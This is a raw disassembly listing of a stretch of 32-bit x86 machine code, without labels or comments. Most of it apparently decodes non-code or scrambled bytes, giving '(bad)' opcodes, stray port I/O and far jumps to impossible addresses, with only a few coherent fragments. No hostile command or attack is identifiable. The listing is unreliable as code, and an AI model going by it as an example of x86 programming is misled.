  40c7e2:	cmp    eax,0x9f9fce6f
  40c7e7:	loopne 0x40c7de
  40c7e9:	lock out dx,eax
  40c7eb:	scas   al,BYTE PTR es:[edi]
  40c7ec:	push   eax
  40c7ed:	or     bh,BYTE PTR [ecx+0x2705e023]
  40c7f3:	(bad)  
  40c7f4:	xchg   edi,eax
  40c7f5:	sar    DWORD PTR [esi+0x64],cl
  40c7f8:	popf   
  40c7f9:	cmovb  ebx,DWORD PTR [eax+0x2a6d5992]
  40c800:	pushf  
  40c801:	aad    0xc5
  40c803:	xchg   DWORD PTR [edi],eax
  40c805:	push   0xffffffeb
  40c807:	(bad)  
  40c809:	mov    BYTE PTR [ebx],cl
  40c80b:	(bad)  
  40c80c:	xchg   esp,eax
  40c80d:	ret    0x2412
  40c810:	ror    BYTE PTR [eax+edi*8-0x29],cl
  40c814:	push   ebx
  40c815:	mov    edx,0x6209b2be
  40c81a:	in     eax,dx
  40c81b:	rcl    BYTE PTR [ebx],0xce
  40c81e:	cmp    BYTE PTR [edi+edi*8],0x24
  40c822:	arpl   WORD PTR [edx+0x58],si
  40c825:	aas    
  40c826:	bound  esp,QWORD PTR [edx-0x532100d6]
  40c82c:	arpl   sp,dx
  40c82e:	sbb    eax,0x37729bb0
  40c833:	daa    
  40c834:	mov    bl,0x40
  40c836:	les    ebp,FWORD PTR [ebp+0x6c]
  40c839:	jge    0x40c83a
  40c83b:	test   al,0xf9
  40c83d:	(bad)  
  40c83e:	es dec ebx
  40c840:	sbb    eax,0x3f3d38a7
  40c845:	push   0xffffff8e
  40c847:	sub    DWORD PTR [eax+0x5a],esi
  40c84a:	leave  
  40c84b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c84c:	mov    gs,WORD PTR [eax+0x7d]
  40c84f:	mov    ds:0xa7ceb027,eax
  40c854:	test   eax,0x76fa5b7
  40c859:	push   0xffffff8e
  40c85b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c85c:	push   edx
  40c85d:	std    
  40c85e:	mov    al,0x3a
  40c860:	jnp    0x40c80f
  40c862:	inc    ebp
  40c863:	sbb    al,0xef
  40c865:	loop   0x40c82e
  40c867:	jmp    0x40c835
  40c869:	jb     0x40c8e6
  40c86b:	jae    0x40c884
  40c86d:	ins    DWORD PTR es:[edi],dx
  40c86e:	ins    BYTE PTR es:[edi],dx
  40c86f:	idiv   BYTE PTR [eax-0x611b5f54]
  40c875:	mov    al,0xe8
  40c877:	inc    esi
  40c878:	and    eax,0x33c0377d
  40c87d:	jns    0x40c8b0
  40c87f:	es cmp eax,0xe9d26b8
  40c885:	sub    dl,BYTE PTR [eax-0x5b04654c]
  40c88b:	mov    bh,0x2
  40c88d:	mov    eax,DWORD PTR [ebp+0xc]
  40c890:	add    eax,DWORD PTR [ebp+0x8]
  40c893:	mov    DWORD PTR [ebp-0x10],eax
  40c896:	mov    eax,DWORD PTR [ebp-0x1c]
  40c899:	test   eax,eax
  40c89b:	je     0x40d717
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0x926c9a9e
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c88e
  40c8c7:	test   al,0x59
  40c8c9:	cmp    esi,esi
  40c8cb:	imul   esi,DWORD PTR [ebp+0x2c57a62c],0xffffffaf
  40c8d2:	and    al,BYTE PTR [ebx]
  40c8d4:	mov    ecx,0x16020c77
  40c8d9:	sub    ch,ch
  40c8db:	adc    al,0x76
  40c8dd:	hlt    
  40c8de:	xchg   BYTE PTR [esi+edi*2-0x4d759fe],cl
  40c8e5:	int3   
  40c8e6:	inc    BYTE PTR [eax]
  40c8e8:	or     esp,DWORD PTR [eax]
  40c8ea:	push   es
  40c8eb:	(bad)  
  40c8ec:	fdiv   QWORD PTR [ecx-0x3b9ffb5c]
  40c8f2:	sbb    ch,ch
  40c8f4:	inc    edx
  40c8f5:	bound  ebx,QWORD PTR [esi+0x1a]
  40c8f8:	pop    eax
  40c8f9:	xlat   BYTE PTR ds:[ebx]
  40c8fa:	mov    eax,ds:0xa2a5bc6e
  40c8ff:	js     0x40c8c4
  40c901:	stos   BYTE PTR es:[edi],al
  40c902:	dec    ebx
  40c903:	xor    DWORD PTR [ecx+0x2664db64],0x781b327
  40c90d:	fcmovb st,st(0)
  40c90f:	mov    ecx,0xcd5e91be
  40c914:	fisttp WORD PTR [ebx]
  40c916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c917:	clc    
  40c918:	xchg   DWORD PTR [ecx-0x1a],edi
  40c91b:	and    al,0x7d
  40c91d:	xor    dl,bh
  40c91f:	mov    edi,0x83d94392
  40c924:	clc    
  40c925:	in     al,0xb4
  40c927:	cmp    al,0xe3
  40c929:	xor    BYTE PTR [ecx],dl
  40c92b:	xor    bh,bh
  40c92d:	jno    0x40c927
  40c92f:	lods   eax,DWORD PTR gs:[esi]
  40c931:	xchg   ebx,eax
  40c932:	and    BYTE PTR [ebx+0x37],al
  40c935:	push   0xfb181d0e
  40c93a:	pop    esi
  40c93b:	push   ss
  40c93c:	fwait
  40c93d:	sub    ah,bh
  40c93f:	nop
  40c940:	fsub   DWORD PTR [esi]
  40c942:	mov    ch,0xe4
  40c944:	jns    0x40c95b
  40c946:	pop    esi
  40c947:	sub    al,0x3e
  40c949:	push   edx
  40c94a:	ins    BYTE PTR es:[edi],dx
  40c94b:	ja     0x40c8fb
  40c94d:	xor    dh,BYTE PTR [edx-0x40dae15e]
  40c953:	out    0x8f,al
  40c955:	mov    ds:0x401fce9c,eax
  40c95a:	add    ebx,DWORD PTR [edi]
  40c95c:	push   ebx
  40c95d:	mov    bh,0x23
  40c95f:	cdq    
  40c960:	inc    eax
  40c961:	xlat   BYTE PTR ds:[ebx]
  40c962:	inc    ebp
  40c963:	jnp    0x40c917
  40c965:	call   0x9660822f
  40c96a:	outs   dx,BYTE PTR ds:[esi]
  40c96b:	jnp    0x40c9cb
  40c96d:	xor    DWORD PTR [esi],0x463890d
  40c973:	xchg   edi,eax
  40c974:	je     0x40c9b2
  40c976:	dec    ebx
  40c977:	jne    0x40c926
  40c979:	xchg   edi,eax
  40c97a:	and    al,0xa
  40c97c:	jmp    0xb42f:0x330c1ac3
  40c983:	bound  esi,QWORD PTR [esi]
  40c985:	mov    ebx,0x40d594b5
  40c98a:	cdq    
  40c98b:	sub    eax,edx
  40c98d:	in     eax,0xa4
  40c98f:	sub    ebp,DWORD PTR [esi+0x4f17d85a]
  40c995:	adc    DWORD PTR [ebx],edi
  40c997:	mov    edi,0xb0ab9c93
  40c99c:	movzx  ebp,WORD PTR [ebp+0x65]
  40c9a0:	pop    ecx
  40c9a1:	push   ds
  40c9a2:	jo     0x40c99c
  40c9a4:	pop    edi
  40c9a5:	ficomp WORD PTR [ebx+0x70ad047b]
  40c9ab:	or     BYTE PTR [bp+di-0x76c9],ah
  40c9b0:	and    al,0x10
  40c9b2:	sahf   
  40c9b3:	mov    al,ds:0x508537e
  40c9b8:	in     al,dx
  40c9b9:	mov    WORD PTR [esi+0x35da6831],?
  40c9bf:	leave  
  40c9c0:	dec    ebx
  40c9c1:	push   ss
  40c9c2:	ins    DWORD PTR es:[edi],dx
  40c9c3:	mov    ebp,0xe377f02d
  40c9c8:	cmp    DWORD PTR [edx-0x3fb0aa35],0x28
  40c9cf:	and    al,0x6d
  40c9d1:	xor    BYTE PTR [edx],0xce
  40c9d4:	imul   edx,esi,0xffffffd4
  40c9d7:	iret   
  40c9d8:	or     al,0xce
  40c9da:	jbe    0x40c973
  40c9dc:	push   ss
  40c9dd:	mov    ds:0x1d9d0a48,al
  40c9e2:	xlat   BYTE PTR ds:[ebx]
  40c9e3:	pop    ecx
  40c9e4:	and    ah,ah
  40c9e6:	(bad)  
  40c9e7:	dec    esi
  40c9e8:	popa   
  40c9e9:	dec    ebp
  40c9ea:	and    al,bl
  40c9ec:	nop
  40c9ed:	rcl    ah,0x2f
  40c9f0:	fisubr DWORD PTR es:0x7f51a88
  40c9f7:	cmp    eax,0x5a27cbd7
  40c9fc:	aad    0x2a
  40c9fe:	gs nop
  40ca00:	mov    bl,0xee
  40ca02:	pop    ss
  40ca03:	jmp    0x494598e2
  40ca08:	jmp    0x40cb66
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0xc3d57bcf
  40ca1c:	stc    
  40ca1d:	dec    eax
  40ca1e:	hlt    
  40ca1f:	jle    0x40ca9f
  40ca21:	aas    
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40c9e0
  40ca26:	stc    
  40ca27:	mov    eax,ds:0xc731d900
  40ca2c:	dec    BYTE PTR [eax]
  40ca2e:	jnp    0x40c9e0
  40ca30:	pop    esi
  40ca31:	call   0xff826ad3
  40ca36:	fwait
  40ca37:	pop    es
  40ca38:	or     DWORD PTR [eax-0x71],0xe329298e
  40ca3f:	sbb    ah,BYTE PTR [ebp+0x33]
  40ca42:	xchg   ecx,eax
  40ca43:	cmp    DWORD PTR ds:0x8a999213,eax
  40ca49:	sbb    ah,0x99
  40ca4c:	int3   
  40ca4d:	push   ds
  40ca4e:	pop    esi
  40ca4f:	mov    dh,0x49
  40ca51:	jp     0x40ca39
  40ca53:	dec    edi
  40ca54:	test   BYTE PTR [ecx],al
  40ca56:	out    dx,al
  40ca57:	xchg   edx,eax
  40ca58:	popa   
  40ca59:	dec    eax
  40ca5a:	outs   dx,DWORD PTR ds:[esi]
  40ca5b:	repz adc dh,BYTE PTR [edi]
  40ca5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca5f:	scas   eax,DWORD PTR es:[edi]
  40ca60:	loop   0x40caaa
  40ca62:	scas   eax,DWORD PTR es:[edi]
  40ca63:	arpl   WORD PTR [eax+0x14357461],ax
  40ca69:	les    esp,FWORD PTR [eax-0x7]
  40ca6c:	dec    esi
  40ca6d:	out    0x91,eax
  40ca6f:	ja     0x40c9fe
  40ca71:	adc    DWORD PTR [eax+0x0],ecx
  40ca74:	stc    
  40ca75:	push   ebx
  40ca76:	test   DWORD PTR [edi+0x7d727c0],esp
  40ca7c:	xchg   edi,eax
  40ca7d:	or     DWORD PTR [edx+0x353eaea3],edi
  40ca83:	addr16 (bad) 
  40ca85:	mov    ebx,0x4d84b821
  40ca8a:	out    0x20,eax
  40ca8c:	loopne 0x40ca66
  40ca8e:	shr    BYTE PTR [eax-0x1],cl
  40ca91:	dec    ecx
  40ca92:	pop    es
  40ca93:	add    eax,0xcf768027
  40ca98:	jno    0x40cabc
  40ca9a:	add    esp,edi
  40ca9c:	out    dx,al
  40ca9d:	inc    eax
  40ca9e:	ss or  dl,dh
  40caa1:	fnsave [edi-0x4]
  40caa4:	pop    edi
  40caa5:	sub    DWORD PTR [edi],0x7fcab70a
  40caab:	imul   ecx,DWORD PTR [esi],0x14
  40caae:	jge    0x40ca4a
  40cab0:	dec    esp
  40cab1:	sti    
  40cab2:	pop    ebx
  40cab3:	mov    ch,BYTE PTR [edx-0x4e1c7c81]
  40cab9:	ss cmp eax,0xab6f14b7
  40cabf:	scas   eax,DWORD PTR es:[di]
  40cac1:	sar    BYTE PTR ds:0x7a9a2ed9,0xbb
  40cac8:	or     dl,bl
  40caca:	faddp  st(3),st
  40cacc:	push   ebx
  40cacd:	sbb    esi,DWORD PTR [ebx]
  40cacf:	mov    eax,0x455aab56
  40cad4:	clc    
  40cad5:	gs adc ecx,eax
  40cad8:	aas    
  40cad9:	jnp    0x40cab5
  40cadb:	and    cl,BYTE PTR [eax+0x79b3923]
  40cae1:	cdq    
  40cae2:	dec    BYTE PTR [ebx]
  40cae4:	cmp    DWORD PTR ds:0x11b90b54,edx
  40caea:	out    dx,al
  40caeb:	icebp  
  40caec:	mov    eax,0x688894e3
  40caf1:	mov    cl,0x57
  40caf3:	adc    bl,dl
  40caf5:	sahf   
  40caf6:	retf   
  40caf7:	push   0xffffffee
  40caf9:	xor    eax,0xc4b239af
  40cafe:	xchg   ecx,ecx
  40cb00:	jmp    0xbcdf:0xa58232a3
  40cb07:	adc    DWORD PTR ds:0xd0add020,ebp
  40cb0d:	shl    BYTE PTR [ebp-0x59e41645],1
  40cb13:	cmp    eax,0x35caf4b8
  40cb18:	xchg   esp,eax
  40cb19:	imul   eax,DWORD PTR [eax-0x755448a1],0x3
  40cb20:	cs nop
  40cb22:	out    dx,eax
  40cb23:	adc    BYTE PTR [esi+0x739215be],0xa9
  40cb2a:	je     0x40cafb
  40cb2c:	xor    al,0x12
  40cb2e:	sbb    edi,edx
  40cb30:	loop   0x40cb0d
  40cb32:	pop    ecx
  40cb33:	jbe    0x40cada
  40cb35:	aaa    
  40cb36:	repnz mov edx,0x55d4e122
  40cb3c:	pusha  
  40cb3d:	mov    WORD PTR [ecx-0x3c],ds
  40cb40:	and    eax,0x747061ec
  40cb45:	repnz sbb eax,ecx
  40cb48:	add    DWORD PTR [ebx+0x6a01f989],0x46
  40cb4f:	push   cs
  40cb50:	pop    ss
  40cb51:	push   ecx
  40cb52:	mov    ecx,0xf8161d1f
  40cb57:	fidiv  DWORD PTR [ebp+0x6c9f9512]
  40cb5d:	cmp    eax,0x42404ad1
  40cb62:	jge    0x40cb56
  40cb64:	sub    DWORD PTR gs:[ebx-0x79],ebx
  40cb68:	retf   
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cb0e
  40cb8b:	sub    BYTE PTR [esi+edx*2+0x7e7ef609],ch
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cba3
  40cb97:	or     al,0xf4
  40cb99:	aad    0x7d
  40cb9b:	cdq    
  40cb9c:	loope  0x40cbfe
  40cb9e:	fs or  ah,dh
  40cba1:	test   ebx,eax
  40cba3:	adc    esp,ebx
  40cba5:	mov    dh,0x4e
  40cba7:	pop    ecx
  40cba8:	dec    edi
  40cba9:	jnp    0x40cb54
  40cbab:	(bad)  
  40cbac:	out    dx,al
  40cbad:	xlat   BYTE PTR ds:[ebx]
  40cbae:	sub    DWORD PTR [edx-0x6dc7c14e],ebx
  40cbb4:	shl    DWORD PTR [ecx-0x2a],0xbc
  40cbb8:	mov    al,0x2a
  40cbba:	cwde   
  40cbbb:	sbb    eax,0xa1ba9cf6
  40cbc0:	or     edx,eax
  40cbc2:	add    ecx,edx
  40cbc4:	cwde   
  40cbc5:	cld    
  40cbc6:	or     BYTE PTR [esi+0x15],dl
  40cbc9:	add    BYTE PTR [ebp-0x4e],dl
  40cbcc:	cmp    eax,0x884b054f
  40cbd1:	mov    edi,0xdca4b01c
  40cbd6:	outs   dx,DWORD PTR ds:[esi]
  40cbd7:	sub    DWORD PTR [ebx-0x2],0xf45db29
  40cbde:	sbb    DWORD PTR [edx+0xc966ba4],edx
  40cbe4:	inc    esp
  40cbe5:	es xor al,0x9b
  40cbe8:	inc    DWORD PTR [ecx]
  40cbea:	addr16 (bad) 
  40cbed:	dec    edi
  40cbee:	xlat   BYTE PTR ds:[ebx]
  40cbef:	gs or  eax,0xd39e901e
  40cbf5:	dec    ebp
  40cbf6:	jbe    0x40cc75
  40cbf8:	into   
  40cbf9:	popf   
  40cbfa:	push   ss
  40cbfb:	rcr    dl,1
  40cbfd:	jg     0x40cc65
  40cbff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc00:	mov    ah,0x27
  40cc02:	add    eax,0xb4d409cb
  40cc07:	pushf  
  40cc08:	and    al,0x11
  40cc0a:	mov    edi,esp
  40cc0c:	jecxz  0x40cc20
  40cc0e:	push   eax
  40cc0f:	rcr    DWORD PTR [edi],cl
  40cc11:	aaa    
  40cc12:	jmp    0xb3546dc8
  40cc17:	add    al,0x26
  40cc19:	(bad)  
  40cc1a:	popa   
  40cc1b:	shl    BYTE PTR [ebp+0x609ff68],0x49
  40cc22:	adc    DWORD PTR [esi],edx
  40cc24:	aad    0x31
  40cc26:	jmp    0xfc7a:0x81c41956
  40cc2d:	dec    ebp
  40cc2e:	sub    ah,bl
  40cc30:	add    eax,0xad146f4
  40cc35:	and    al,0x45
  40cc37:	mov    ds:0xa97dbe6b,al
  40cc3c:	aaa    
  40cc3d:	sti    
  40cc3e:	test   dh,ch
  40cc40:	in     al,0x15
  40cc42:	mov    edx,0xe4968cc4
  40cc47:	inc    ebp
  40cc48:	lds    edx,FWORD PTR [eax]
  40cc4a:	mov    dl,0x5d
  40cc4c:	push   es
  40cc4d:	jbe    0x40cc7f
  40cc4f:	push   cs
  40cc50:	ins    BYTE PTR es:[edi],dx
  40cc51:	jne    0x40cc9d
  40cc53:	iret   
  40cc54:	jne    0x40cc5f
  40cc56:	adc    DWORD PTR [esi+edx*2+0x270fd962],ebx
  40cc5d:	test   DWORD PTR [esi+0x1a],ecx
  40cc60:	outs   dx,BYTE PTR ds:[esi]
  40cc61:	xchg   ecx,eax
  40cc62:	loopne 0x40cc2a
  40cc64:	into   
  40cc65:	sub    al,0x29
  40cc67:	fsub   DWORD PTR [ecx+ebx*4+0x16]
  40cc6b:	fild   DWORD PTR [edx+0x36]
  40cc6e:	jne    0x40cceb
  40cc70:	push   edi
  40cc71:	das    
  40cc72:	lea    ebx,[edi-0x144ad7a8]
  40cc78:	xchg   ebp,esi
  40cc7a:	mov    dh,BYTE PTR [edi-0x5bdd3b16]
  40cc80:	imul   ecx,DWORD PTR [ebp+0x4aa05bfb],0x67
  40cc87:	mov    dh,BYTE PTR [edi]
  40cc89:	rcl    eax,1
  40cc8b:	(bad)  
  40cc8d:	test   BYTE PTR [ecx-0x24cb1181],al
  40cc93:	inc    esi
  40cc94:	adc    eax,ebp
  40cc96:	imul   eax,DWORD PTR ds:0x421ae733,0xf49e361d
  40cca0:	jo     0x40cc7c
  40cca2:	(bad)  
  40cca3:	int3   
  40cca4:	xchg   esp,eax
  40cca5:	inc    esi
  40cca6:	pop    eax
  40cca7:	xchg   ecx,eax
  40cca8:	mov    ecx,0x1f8ac56
  40ccad:	mov    edi,0xe70f0028
  40ccb2:	pop    ds
  40ccb3:	dec    edi
  40ccb4:	fnsave [ebp-0x51cf38a4]
  40ccba:	pusha  
  40ccbb:	loope  0x40ccdb
  40ccbd:	jne    0x40ccef
  40ccbf:	dec    edx
  40ccc0:	sub    ch,ah
  40ccc2:	out    dx,eax
  40ccc3:	cdq    
  40ccc4:	adc    al,0x26
  40ccc6:	imul   eax,DWORD PTR [eax-0x38c1c22d],0xe3bed37d
  40ccd0:	sbb    BYTE PTR [ebp+ecx*2+0x64d35f01],0x8b
  40ccd8:	inc    ebp
  40ccd9:	cld    
  40ccda:	mov    ecx,0x7510856
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0x4eec1d3a
  40ccf1:	mov    ebp,0xf7cade25
  40ccf6:	jle    0x40cd76
  40ccf8:	aas    
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cd23
  40ccfd:	(bad)  
  40ccfe:	jnp    0x40cc9a
  40cd00:	xchg   ecx,eax
  40cd01:	jo     0x40cc9c
  40cd03:	pusha  
  40cd04:	sub    DWORD PTR [edx-0x1b2426ed],0x57d80f32
  40cd0e:	push   eax
  40cd0f:	jge    0x40cd15
  40cd11:	cmp    DWORD PTR [ebx+0x29afc3cd],ecx
  40cd17:	xor    eax,0xc53b682b
  40cd1c:	jmp    0x177857db
  40cd21:	outs   dx,DWORD PTR ds:[esi]
  40cd22:	jg     0x40cd11
  40cd24:	inc    eax
  40cd25:	and    bl,BYTE PTR [eax]
  40cd27:	enter  0xe914,0x2f
  40cd2b:	push   es
  40cd2c:	(bad)  
  40cd2d:	ss sbb al,0xdd
  40cd30:	mov    bh,0xd8
  40cd32:	nop
  40cd33:	(bad)
  40cd38:	mov    cl,BYTE PTR [ebx-0x5a]
  40cd3b:	fisubr DWORD PTR [edi+0x7d]
  40cd3e:	lea    esi,[esp+eiz*2]
  40cd41:	cmp    eax,DWORD PTR [ebp+eax*8-0x79]
  40cd45:	and    edx,DWORD PTR [esi]
  40cd47:	xchg   edi,eax
  40cd48:	push   edx
  40cd49:	mov    ch,0x8b
  40cd4b:	cld    
  40cd4c:	mov    dl,0x31
  40cd4e:	and    BYTE PTR [edx],cl
  40cd50:	ins    DWORD PTR es:[edi],dx
  40cd51:	loop   0x40cd29
  40cd53:	(bad)
  40cd57:	icebp  
  40cd58:	fwait
  40cd59:	push   edx
  40cd5a:	jl     0x40cd87
  40cd5c:	pop    esi
  40cd5d:	push   esp
  40cd5e:	dec    ecx
  40cd5f:	rcr    DWORD PTR [eax-0x15],cl
  40cd62:	mov    ecx,0x85d9564b
  40cd67:	cdq    
  40cd68:	hlt    
  40cd69:	ins    DWORD PTR es:[edi],dx
  40cd6a:	sbb    al,0xfa
  40cd6c:	xchg   esp,eax
  40cd6d:	xchg   esp,eax
  40cd6e:	ja     0x40cdec
  40cd70:	push   eax
  40cd71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd72:	adc    DWORD PTR [edi],ebx
  40cd74:	inc    ebp
  40cd75:	pusha  
  40cd76:	jge    0x40cd85
  40cd78:	mov    edi,0x365995bc
  40cd7d:	sub    DWORD PTR [ebx+0x49900b26],0xd87c0d6e
  40cd87:	or     edi,edx
  40cd89:	sbb    bh,dl
  40cd8b:	sbb    al,0x46
  40cd8d:	addr16 addr16 loopne 0x40cd57
  40cd91:	pop    edx
  40cd92:	adc    bh,bh
  40cd94:	ret    
  40cd95:	js     0x40cd4b
  40cd97:	sub    ecx,edi
  40cd99:	or     BYTE PTR [edi],0x4
  40cd9c:	pop    esp
  40cd9d:	and    DWORD PTR [edi+0x5f989008],edi
  40cda3:	ret    
  40cda4:	lds    ebp,FWORD PTR [edx+0x4c]
  40cda7:	mov    dh,BYTE PTR ds:0xe29f0733
  40cdad:	jno    0x40cdc8
  40cdaf:	pushf  
  40cdb0:	sbb    DWORD PTR [edx-0x5],eax
  40cdb3:	sbb    al,0xa3
  40cdb5:	xor    DWORD PTR [ebx-0x73],esi
  40cdb8:	in     al,dx
  40cdb9:	jbe    0x40cde5
  40cdbb:	neg    BYTE PTR [esi-0x27]
  40cdbe:	mov    ah,0x60
  40cdc0:	adc    BYTE PTR [ebp-0x15],dl
  40cdc3:	loopne 0x40cdd0
  40cdc5:	ds mov esi,0x2c08db98
  40cdcb:	inc    ebp
  40cdcc:	adc    DWORD PTR [ebx-0x49],esp
  40cdcf:	add    esp,DWORD PTR ds:0xadb90ebb
  40cdd5:	cmp    DWORD PTR [eax-0x1e],edi
  40cdd8:	ret    0x689f
  40cddb:	les    esp,FWORD PTR [edx]
  40cddd:	add    bl,al
  40cddf:	icebp  
  40cde0:	daa    
  40cde1:	or     eax,0x1eb6afbe
  40cde6:	jle    0x40cdd4
  40cde8:	xor    BYTE PTR [eax+0x10],bl
  40cdeb:	pushf  
  40cdec:	sub    DWORD PTR [edx],esp
  40cdee:	add    eax,0x5e421b93
  40cdf3:	cmp    al,0x60
  40cdf5:	retf   0x144b
  40cdf8:	ins    DWORD PTR es:[edi],dx
  40cdf9:	lahf   
  40cdfa:	add    al,0x32
  40cdfc:	nop
  40cdfd:	out    dx,al
  40cdfe:	cli    
  40cdff:	xchg   esp,eax
  40ce00:	les    edi,FWORD PTR [ebx+0x7b]
  40ce03:	ss iret 
  40ce05:	sbb    BYTE PTR [esi-0x10a6d067],cl
  40ce0b:	dec    esp
  40ce0c:	bound  esi,QWORD PTR [eax-0x769e2785]
  40ce12:	jle    0x40ce93
  40ce14:	sahf   
  40ce15:	pop    es
  40ce16:	outs   dx,BYTE PTR ds:[esi]
  40ce17:	call   0x1274:0x353fd0ff
  40ce1e:	jmp    FWORD PTR [esp+edi*4+0x5f]
  40ce22:	jmp    0x8d0c38f6
  40ce27:	mov    fs,ebx
  40ce29:	pop    esp
  40ce2a:	pmulhw mm0,mm3
  40ce2d:	arpl   WORD PTR [ecx-0x17],bx
  40ce30:	sbb    BYTE PTR [ecx],dl
  40ce32:	(bad)  
  40ce33:	mov    dl,0x37
  40ce35:	sbb    edx,DWORD PTR [ecx-0x2b]
  40ce38:	push   edx
  40ce39:	xchg   DWORD PTR [edx-0x24],eax
  40ce3c:	(bad)  [ebx]
  40ce3e:	sar    DWORD PTR [edx+0x32729d],0x3
  40ce45:	ret    0x59e9
  40ce48:	add    DWORD PTR [eax],eax
  40ce4a:	add    BYTE PTR [edx-0x52a4f329],dh
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0x71335331,eax
  40ce59:	leave  
  40ce5a:	dec    DWORD PTR [ebx+0x3f7e7e88]
  40ce60:	jg     0x40cee0
  40ce62:	jle    0x40cecc
  40ce64:	int3   
  40ce65:	xchg   esp,eax
  40ce66:	loope  0x40cedb
  40ce68:	aad    0xf
  40ce6a:	jecxz  0x40ce15
  40ce6c:	mov    cl,0x38
  40ce6e:	shl    DWORD PTR [eax+ecx*8],1
  40ce71:	mov    al,0x19
  40ce73:	and    cl,BYTE PTR [edi-0x48]
  40ce76:	loop   0x40ce77
  40ce78:	jecxz  0x40ceaa
  40ce7a:	push   ds
  40ce7b:	inc    ebp
  40ce7c:	mov    ah,0x16
  40ce7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce7f:	mov    esi,0x98a37af1
  40ce84:	jmp    0xae005465
  40ce89:	fnstcw WORD PTR [ecx-0x4]
  40ce8c:	fmul   st,st(2)
  40ce8e:	cs ins BYTE PTR es:[edi],dx
  40ce90:	sbb    eax,0xd539f505
  40ce95:	stos   DWORD PTR es:[edi],eax
  40ce96:	sar    DWORD PTR [eax+0x3a],0xe8
  40ce9a:	xchg   edx,eax
  40ce9b:	cld    
  40ce9c:	pop    edi
  40ce9d:	sbb    eax,0x33916929
  40cea2:	push   ds
  40cea3:	push   ebp
  40cea4:	aam    0x72
  40cea6:	sub    al,0x4d
  40cea8:	(bad)  
  40cea9:	jae    0x40ce79
  40ceab:	repnz out 0x67,eax
  40ceae:	imul   BYTE PTR [edx+0x67e8ab7f]
  40ceb4:	jmp    0x5b73:0xf240e61a
  40cebb:	pushf  
  40cebc:	sbb    bh,0xaf
  40cebf:	push   ebx
  40cec0:	bound  ebx,QWORD PTR [ecx-0x2f]
  40cec3:	mov    dh,BYTE PTR [esi+0x53]
  40cec6:	dec    esi
  40cec7:	adc    DWORD PTR [ebp+0xe],esp
  40ceca:	addr16 push es
  40cecc:	add    DWORD PTR [esi+ebp*1],0x66
  40ced0:	int    0x72
  40ced2:	nop
  40ced3:	pop    edx
  40ced4:	vpmacssww ymm5,ymm0,YMMWORD PTR cs:[eax+0x6b9586ae],ymm5
  40cedf:	jge    0x40cf46
  40cee1:	cwde   
  40cee2:	xor    dl,BYTE PTR [ebx+0x2168b3bd]
  40cee8:	mov    DWORD PTR [eax+ecx*4],eax
  40ceeb:	iret   
  40ceec:	dec    ebx
  40ceed:	stos   DWORD PTR es:[edi],eax
  40ceee:	ins    BYTE PTR es:[edi],dx
  40ceef:	lods   eax,DWORD PTR ds:[esi]
  40cef0:	inc    eax
  40cef1:	ds push ecx
  40cef3:	es push ds
  40cef5:	popf   
  40cef6:	xchg   ebp,eax
  40cef7:	scas   eax,DWORD PTR es:[edi]
  40cef8:	popf   
  40cef9:	enter  0x8b87,0x1c
  40cefd:	inc    eax
  40cefe:	repz mov esp,0x907f6e36
  40cf04:	xor    esp,edi
  40cf06:	aad    0x4
  40cf08:	inc    edi
  40cf09:	xor    BYTE PTR [edi+0x3],al
  40cf0c:	pop    ecx
  40cf0d:	xchg   edx,eax
  40cf0e:	pusha  
  40cf0f:	ins    BYTE PTR es:[edi],dx
  40cf10:	lahf   
  40cf11:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40cf13:	pop    ebp
  40cf14:	and    edx,eax
  40cf16:	stos   BYTE PTR es:[edi],al
  40cf17:	sbb    ch,ch
  40cf19:	cdq    
  40cf1a:	iret   
  40cf1b:	(bad)  
  40cf1d:	scas   eax,DWORD PTR es:[edi]
  40cf1e:	inc    esi
  40cf1f:	mov    DWORD PTR [ebx+edi*1-0x7d],edx
  40cf23:	and    DWORD PTR [edi-0x56],esi
  40cf26:	xor    al,0xff
  40cf28:	jns    0x40cefb
  40cf2a:	ja     0x40cee9
  40cf2c:	ret    0xcd78
  40cf2f:	(bad)  
  40cf30:	loopne 0x40cec4
  40cf32:	(bad)  
  40cf33:	scas   al,BYTE PTR es:[edi]
  40cf34:	lock dec eax
  40cf36:	aad    0xef
  40cf38:	out    0x63,eax
  40cf3a:	test   eax,0x31dd0e64
  40cf3f:	mov    dl,0x47
  40cf41:	aam    0x91
